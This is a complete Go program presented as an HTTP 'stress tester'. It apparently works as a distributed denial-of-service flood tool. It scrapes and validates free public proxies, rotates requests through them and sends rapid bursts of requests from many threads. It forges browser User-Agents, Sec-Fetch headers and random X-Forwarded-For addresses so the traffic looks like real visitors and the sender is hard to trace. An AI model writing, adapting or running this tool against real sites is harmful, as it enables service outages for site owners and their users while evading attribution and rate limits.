// File: stress-tester.go
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Global state for HTTP request templates
var (
	httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
	languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
	contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
	ProxyMgr   *ProxyManager
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	// Flags for proxy scraping and testing
	proxySourcesFlag := flag.String("proxy-sources", "", "Comma-separated URLs of proxy lists. If empty, will use built-in defaults.")
	proxyRefreshFlag := flag.Duration("proxy-refresh", 30*time.Minute, "How often to refresh/scrape proxy sources.")
	proxyTimeoutFlag := flag.Duration("proxy-timeout", 3*time.Second, "Timeout for dialing proxies when using them.")
	noFailoverFlag := flag.Bool("no-proxy-failover", false, "If set, do not remove proxies from pool on failure.")

	proxyTestFlag := flag.Bool("proxy-test", true, "Enable testing scraped proxies for quality.")
	proxyTestTimeoutFlag := flag.Duration("proxy-test-timeout", 3*time.Second, "Timeout for proxy quick test (TCP+CONNECT/GET).")
	proxyMaxLatencyFlag := flag.Duration("proxy-max-latency", 500*time.Millisecond, "Max acceptable latency for proxy quick test.")
	proxyTestConcurrencyFlag := flag.Int("proxy-test-concurrency", 50, "Max concurrent proxy tests during refresh.")
	proxyTestLimitFlag := flag.Int("proxy-test-limit", 200, "Max proxies to test per refresh (0 = all).")
	proxyPoolSizeFlag := flag.Int("proxy-pool-size", 300, "Desired number of successful proxies to collect before stopping testing.")

	flag.Parse()

	// Positional args: URL, THREADS, DURATION_SEC, [CUSTOM_HOST]
	args := flag.Args()
	if len(args) < 3 {
		fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST] [flags]")
		flag.PrintDefaults()
		os.Exit(1)
	}
	rawURL := args[0]
	threads, err := strconv.Atoi(args[1])
	if err != nil || threads <= 0 {
		fmt.Println("Invalid THREADS:", args[1])
		os.Exit(1)
	}
	durSec, err := strconv.Atoi(args[2])
	if err != nil || durSec <= 0 {
		fmt.Println("Invalid DURATION_SEC:", args[2])
		os.Exit(1)
	}
	custom := ""
	if len(args) > 3 {
		custom = args[3]
	}

	parsed, err := url.Parse(rawURL)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		os.Exit(1)
	}
	port := determinePort(parsed)
	path := parsed.RequestURI()

	// Build ProxyManager
	var sources []string
	if *proxySourcesFlag != "" {
		for _, s := range strings.Split(*proxySourcesFlag, ",") {
			if t := strings.TrimSpace(s); t != "" {
				sources = append(sources, t)
			}
		}
	} else {
		sources = []string{
			"https://free-proxy-list.net/",
			"https://www.sslproxies.org/",
			"https://www.proxy-list.download/HTTPS",
			"https://www.us-proxy.org/",
		}
	}

	proxyMgr := NewProxyManager(
		sources,
		*proxyRefreshFlag,
		*proxyTimeoutFlag,
		!*noFailoverFlag,
		*proxyTestFlag,
		parsed,
		*proxyTestTimeoutFlag,
		*proxyMaxLatencyFlag,
		*proxyTestConcurrencyFlag,
		*proxyTestLimitFlag,
		*proxyPoolSizeFlag,
	)
	proxyMgr.Start()

	cfg := StressConfig{
		Target:     parsed,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: custom,
		Port:       port,
		Path:       path,
		ProxyMgr:   proxyMgr,
	}
	fmt.Printf("Starting stress test: %s via %s, threads=%d, duration=%v, proxies-enabled=%v\n",
		rawURL, path, threads, cfg.Duration, cfg.ProxyMgr != nil)
	runWorkers(cfg)
	fmt.Println("Stress test completed.")
}

func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if pi, err := strconv.Atoi(p); err == nil {
			return pi
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

func runWorkers(cfg StressConfig) {
	var wg sync.WaitGroup
	stopCh := time.After(cfg.Duration)
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			var conn net.Conn
			var proxyAddr string
			tlsCfg := &tls.Config{
				ServerName:         cfg.Target.Hostname(),
				InsecureSkipVerify: true,
			}
			targetHostPort := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)

			ticker := time.NewTicker(60 * time.Millisecond)
			defer ticker.Stop()

			for {
				select {
				case <-stopCh:
					if conn != nil {
						conn.Close()
					}
					return
				case <-ticker.C:
					// Ensure we have a live connection; if not, pick a proxy and dial
					if conn == nil {
						if cfg.ProxyMgr != nil {
							proxyAddr = cfg.ProxyMgr.GetProxy()
						} else {
							proxyAddr = ""
						}
						var err error
						if proxyAddr == "" {
							conn, err = dialPlainOrTLS(targetHostPort, tlsCfg, cfg.Target.Scheme == "https")
							if err != nil {
								fmt.Printf("[worker %d direct dial error] %v\n", id, err)
								conn = nil
								continue
							}
						} else {
							conn, err = dialViaHTTPProxy(proxyAddr, targetHostPort, tlsCfg, cfg.Target.Scheme == "https", cfg.ProxyMgr.timeout)
							if err != nil {
								cfg.ProxyMgr.ReportFailure(proxyAddr)
								fmt.Printf("[worker %d proxy %s dial error] %v\n", id, proxyAddr, err)
								conn = nil
								continue
							}
						}
					}

					viaProxy := (proxyAddr != "")
					err := sendBurstOnConn(cfg, conn, viaProxy)
					if err != nil {
						fmt.Printf("[worker %d burst error] %v\n", id, err)
						conn.Close()
						conn = nil
						if proxyAddr != "" {
							cfg.ProxyMgr.ReportFailure(proxyAddr)
						}
					}
				}
			}
		}(i)
	}
	wg.Wait()
}

func sendBurstOnConn(cfg StressConfig, conn net.Conn, viaProxy bool) error {
	for i := 0; i < 180; i++ {
		method := httpMethods[rand.Intn(len(httpMethods))]
		header, body := buildRequest(cfg, method, viaProxy)
		var bufs net.Buffers
		bufs = append(bufs, []byte(header))
		if method == "POST" {
			bufs = append(bufs, body)
		}
		if _, err := bufs.WriteTo(conn); err != nil {
			return err
		}
	}
	return nil
}

func dialPlainOrTLS(address string, tlsCfg *tls.Config, isHTTPS bool) (net.Conn, error) {
	if isHTTPS {
		return tls.Dial("tcp", address, tlsCfg)
	}
	return net.DialTimeout("tcp", address, 5*time.Second)
}

func dialViaHTTPProxy(proxyAddr, targetHostPort string, tlsCfg *tls.Config, isHTTPS bool, proxyTimeout time.Duration) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxyAddr, proxyTimeout)
	if err != nil {
		return nil, err
	}
	if isHTTPS {
		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: keep-alive\r\n\r\n",
			targetHostPort, targetHostPort)
		if _, err := conn.Write([]byte(connectReq)); err != nil {
			conn.Close()
			return nil, err
		}
		buf := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(proxyTimeout))
		n, err := conn.Read(buf)
		if err != nil {
			conn.Close()
			return nil, err
		}
		resp := string(buf[:n])
		if !strings.Contains(resp, " 200 ") {
			conn.Close()
			firstLine := strings.SplitN(resp, "\r\n", 2)[0]
			return nil, fmt.Errorf("proxy CONNECT failed: %s", firstLine)
		}
		tlsConn := tls.Client(conn, tlsCfg)
		if err := tlsConn.Handshake(); err != nil {
			tlsConn.Close()
			return nil, err
		}
		return tlsConn, nil
	}
	return conn, nil
}

func buildRequest(cfg StressConfig, method string, viaProxy bool) ([]byte, []byte) {
	var buf bytes.Buffer
	hostHdr := cfg.Target.Hostname()
	if cfg.CustomHost != "" {
		hostHdr = cfg.CustomHost
	}
	if viaProxy && cfg.Target.Scheme == "http" {
		buf.WriteString(fmt.Sprintf("%s %s://%s%s HTTP/1.1\r\n", method, cfg.Target.Scheme, cfg.Target.Host, cfg.Path))
	} else {
		buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, cfg.Path))
	}
	buf.WriteString("Host: " + hostHdr)
	if cfg.Port != 80 && cfg.Port != 443 {
		buf.WriteString(":" + strconv.Itoa(cfg.Port))
	}
	buf.WriteString("\r\n")
	writeCommonHeaders(&buf)

	var body []byte
	if method == "POST" {
		ct := contentTypes[rand.Intn(len(contentTypes))]
		body = createBody(ct)
		buf.WriteString("Content-Type: " + ct + "\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\n")
	}
	buf.WriteString("Referer: https://" + hostHdr + "/\r\nConnection: keep-alive\r\n\r\n")
	out := make([]byte, buf.Len())
	copy(out, buf.Bytes())
	return out, body
}

func writeCommonHeaders(buf *bytes.Buffer) {
	buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
	buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
	buf.WriteString("Sec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n")
	buf.WriteString("Upgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\n")
	fmt.Fprintf(buf, "X-Forwarded-For: %d.%d.%d.%d\r\n",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func createBody(contentType string) []byte {
	var b bytes.Buffer
	switch contentType {
	case "application/x-www-form-urlencoded":
		vals := url.Values{}
		for i := 0; i < 3; i++ {
			vals.Set(randomString(5), randomString(8))
		}
		b.WriteString(vals.Encode())
	case "application/json":
		b.WriteByte('{')
		for i := 0; i < 3; i++ {
			if i > 0 {
				b.WriteByte(',')
			}
			fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
		}
		b.WriteByte('}')
	case "text/plain":
		b.WriteString("text_" + randomString(12))
	}
	return b.Bytes()
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randomUserAgent() string {
	osList := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
	os := osList[rand.Intn(len(osList))]
	switch rand.Intn(3) {
	case 0:
		v := fmt.Sprintf("%d.0.%d.0", rand.Intn(40)+80, rand.Intn(4000))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/%s", os, v, v)
	case 1:
		v := fmt.Sprintf("%d.0", rand.Intn(40)+70)
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, v, v)
	default:
		v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/13.1 Safari/%s", os, v, v)
	}
}

// ------------- ProxyManager -------------

type ProxyManager struct {
	sources         []string
	refreshInterval time.Duration
	timeout         time.Duration
	failover        bool
	testEnabled     bool
	testTarget      *url.URL
	testTimeout     time.Duration
	maxTestLatency  time.Duration
	testConcurrency int
	testLimit       int
	desiredPoolSize int

	mu            sync.RWMutex
	proxies       []string
	quitCh        chan struct{}
	regexIP       *regexp.Regexp
	testedSuccess map[string]struct{}
	testedFailure map[string]struct{}
	testedMutex   sync.Mutex
}

func NewProxyManager(
	sources []string,
	refreshInterval, timeout time.Duration,
	failover bool,
	testEnabled bool,
	testTarget *url.URL,
	testTimeout, maxTestLatency time.Duration,
	testConcurrency, testLimit, desiredPoolSize int,
) *ProxyManager {
	reg := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b`)
	return &ProxyManager{
		sources:         sources,
		refreshInterval: refreshInterval,
		timeout:         timeout,
		failover:        failover,
		testEnabled:     testEnabled,
		testTarget:      testTarget,
		testTimeout:     testTimeout,
		maxTestLatency:  maxTestLatency,
		testConcurrency: testConcurrency,
		testLimit:       testLimit,
		desiredPoolSize: desiredPoolSize,
		proxies:         make([]string, 0),
		quitCh:          make(chan struct{}),
		regexIP:         reg,
		testedSuccess:   make(map[string]struct{}),
		testedFailure:   make(map[string]struct{}),
	}
}

func (pm *ProxyManager) Start() {
	pm.fetchAllSources()
	ticker := time.NewTicker(pm.refreshInterval)
	go func() {
		for {
			select {
			case <-ticker.C:
				pm.fetchAllSources()
			case <-pm.quitCh:
				ticker.Stop()
				return
			}
		}
	}()
}

func (pm *ProxyManager) Stop() {
	close(pm.quitCh)
}

// GetProxy returns a random proxy "host:port", or "" if none available
func (pm *ProxyManager) GetProxy() string {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	if len(pm.proxies) == 0 {
		return ""
	}
	return pm.proxies[rand.Intn(len(pm.proxies))]
}

func (pm *ProxyManager) ReportFailure(proxy string) {
	if !pm.failover {
		return
	}
	pm.mu.Lock()
	defer pm.mu.Unlock()
	for i, p := range pm.proxies {
		if p == proxy {
			pm.proxies = append(pm.proxies[:i], pm.proxies[i+1:]...)
			break
		}
	}
	// Also record failure so we don't retest immediately
	pm.testedMutex.Lock()
	pm.testedFailure[proxy] = struct{}{}
	pm.testedMutex.Unlock()
}

func (pm *ProxyManager) fetchAllSources() {
	for _, src := range pm.sources {
		rawList, err := pm.scrapeSource(src)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[proxy scrape error] %s: %v\n", src, err)
			continue
		}
		if pm.testEnabled {
			good := pm.filterNewAndTest(rawList)
			pm.mergeProxies(good)
		} else {
			pm.mergeProxies(rawList)
		}
	}
}

func (pm *ProxyManager) mergeProxies(newList []string) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	// If we've already reached desiredPoolSize successes, ensure proxies list equals testedSuccess keys
	pm.testedMutex.Lock()
	successCount := len(pm.testedSuccess)
	pm.testedMutex.Unlock()
	if successCount >= pm.desiredPoolSize {
		// rebuild proxies from testedSuccess
		var ps []string
		pm.testedMutex.Lock()
		for p := range pm.testedSuccess {
			ps = append(ps, p)
		}
		pm.testedMutex.Unlock()
		rand.Shuffle(len(ps), func(i, j int) {
			ps[i], ps[j] = ps[j], ps[i]
		})
		pm.proxies = ps
		return
	}
	// Otherwise, append newList entries
	existing := make(map[string]struct{}, len(pm.proxies))
	for _, p := range pm.proxies {
		existing[p] = struct{}{}
	}
	for _, p := range newList {
		if _, ok := existing[p]; !ok {
			pm.proxies = append(pm.proxies, p)
		}
	}
	rand.Shuffle(len(pm.proxies), func(i, j int) {
		pm.proxies[i], pm.proxies[j] = pm.proxies[j], pm.proxies[i]
	})
}

func (pm *ProxyManager) scrapeSource(src string) ([]string, error) {
	client := http.Client{
		Timeout: pm.timeout,
	}
	resp, err := client.Get(src)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 2<<20))
	if err != nil {
		return nil, err
	}
	ct := resp.Header.Get("Content-Type")
	if strings.Contains(ct, "text/plain") || strings.HasSuffix(strings.ToLower(src), ".txt") {
		return pm.parsePlainText(bodyBytes), nil
	}
	return pm.parseWithRegex(bodyBytes), nil
}

func (pm *ProxyManager) parsePlainText(data []byte) []string {
	var res []string
	scanner := bufio.NewScanner(bytes.NewReader(data))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if pm.regexIP.MatchString(line) {
			m := pm.regexIP.FindString(line)
			if m != "" && validIPPort(m) {
				res = append(res, m)
			}
		}
	}
	return res
}

func (pm *ProxyManager) parseWithRegex(data []byte) []string {
	matches := pm.regexIP.FindAll(data, -1)
	seen := make(map[string]struct{})
	var res []string
	for _, m := range matches {
		s := string(m)
		if validIPPort(s) {
			if _, ok := seen[s]; !ok {
				seen[s] = struct{}{}
				res = append(res, s)
			}
		}
	}
	return res
}

// filterNewAndTest filters raw proxies: skip those already tested (success or failure), then test up to testLimit
// and stop early once testedSuccess reaches desiredPoolSize.
func (pm *ProxyManager) filterNewAndTest(rawList []string) []string {
	// Build caches snapshot
	pm.testedMutex.Lock()
	successCache := make(map[string]struct{}, len(pm.testedSuccess))
	for p := range pm.testedSuccess {
		successCache[p] = struct{}{}
	}
	failureCache := make(map[string]struct{}, len(pm.testedFailure))
	for p := range pm.testedFailure {
		failureCache[p] = struct{}{}
	}
	currentSuccess := len(pm.testedSuccess)
	pm.testedMutex.Unlock()

	// If already have enough successes, skip testing new ones
	if currentSuccess >= pm.desiredPoolSize {
		return nil
	}

	// Collect new proxies not in either cache
	var toTestAll []string
	for _, p := range rawList {
		if _, ok := successCache[p]; ok {
			continue
		}
		if _, ok := failureCache[p]; ok {
			continue
		}
		toTestAll = append(toTestAll, p)
	}
	if len(toTestAll) == 0 {
		return nil
	}
	// Shuffle and limit how many to test this round
	rand.Shuffle(len(toTestAll), func(i, j int) {
		toTestAll[i], toTestAll[j] = toTestAll[j], toTestAll[i]
	})
	limit := pm.testLimit
	if limit <= 0 || limit > len(toTestAll) {
		limit = len(toTestAll)
	}
	toTest := toTestAll[:limit]

	// Channels and sync for testing with early stop
	var wg sync.WaitGroup
	sem := make(chan struct{}, pm.testConcurrency)
	successCh := make(chan string)
	done := make(chan struct{})

	// A helper to check if we should stop: checks testedSuccess length under lock
	shouldStop := func() bool {
		pm.testedMutex.Lock()
		defer pm.testedMutex.Unlock()
		return len(pm.testedSuccess) >= pm.desiredPoolSize
	}

	for _, proxy := range toTest {
		// Before launching, check if already reached desired
		if shouldStop() {
			break
		}
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			// Early exit if done
			select {
			case <-done:
				return
			default:
			}
			sem <- struct{}{}
			defer func() { <-sem }()
			// Test quickly
			if pm.testProxyQuick(p) {
				// Lock and add to testedSuccess if still below desired
				pm.testedMutex.Lock()
				if _, exists := pm.testedSuccess[p]; !exists && len(pm.testedSuccess) < pm.desiredPoolSize {
					pm.testedSuccess[p] = struct{}{}
					select {
					case successCh <- p:
					case <-done:
					}
					// If now reached desired, close done
					if len(pm.testedSuccess) >= pm.desiredPoolSize {
						close(done)
					}
				}
				pm.testedMutex.Unlock()
			} else {
				pm.testedMutex.Lock()
				pm.testedFailure[p] = struct{}{}
				pm.testedMutex.Unlock()
			}
		}(proxy)
	}

	// Wait and close successCh
	go func() {
		wg.Wait()
		close(successCh)
	}()

	// Collect successes to return
	var good []string
	for p := range successCh {
		good = append(good, p)
	}
	return good
}

// testProxyQuick does a minimal check: TCP dial to proxy, then CONNECT (for HTTPS target) or GET root (for HTTP) with deadlines.
func (pm *ProxyManager) testProxyQuick(proxyAddr string) bool {
	// Dial proxy
	start := time.Now()
	conn, err := net.DialTimeout("tcp", proxyAddr, pm.timeout)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Prepare target host:port
	targetHost := pm.testTarget.Hostname()
	targetPort := pm.testTarget.Port()
	if targetPort == "" {
		if pm.testTarget.Scheme == "https" {
			targetPort = "443"
		} else {
			targetPort = "80"
		}
	}
	hostPort := net.JoinHostPort(targetHost, targetPort)

	deadline := time.Now().Add(pm.testTimeout)
	conn.SetDeadline(deadline)

	if pm.testTarget.Scheme == "https" {
		// send CONNECT
		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: close\r\n\r\n", hostPort, hostPort)
		if _, err := conn.Write([]byte(connectReq)); err != nil {
			return false
		}
		// read status line
		var buf [256]byte
		n, err := conn.Read(buf[:])
		if err != nil {
			return false
		}
		line := string(buf[:n])
		if !strings.HasPrefix(line, "HTTP/1.1 200") && !strings.HasPrefix(line, "HTTP/1.0 200") {
			return false
		}
	} else {
		// HTTP: send minimal GET
		urlStr := fmt.Sprintf("http://%s/", pm.testTarget.Host)
		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", urlStr, pm.testTarget.Host)
		if _, err := conn.Write([]byte(req)); err != nil {
			return false
		}
		// read status line
		var buf [256]byte
		n, err := conn.Read(buf[:])
		if err != nil {
			return false
		}
		line := string(buf[:n])
		if !strings.HasPrefix(line, "HTTP/1.1 2") && !strings.HasPrefix(line, "HTTP/1.0 2") &&
			!strings.HasPrefix(line, "HTTP/1.1 3") && !strings.HasPrefix(line, "HTTP/1.0 3") {
			return false
		}
	}
	lat := time.Since(start)
	if lat > pm.maxTestLatency {
		return false
	}
	return true
}

func validIPPort(s string) bool {
	parts := strings.Split(s, ":")
	if len(parts) != 2 {
		return false
	}
	ip := parts[0]
	portStr := parts[1]
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		return false
	}
	octets := strings.Split(ip, ".")
	if len(octets) != 4 {
		return false
	}
	for _, o := range octets {
		v, err := strconv.Atoi(o)
		if err != nil || v < 0 || v > 255 {
			return false
		}
	}
	return true
}
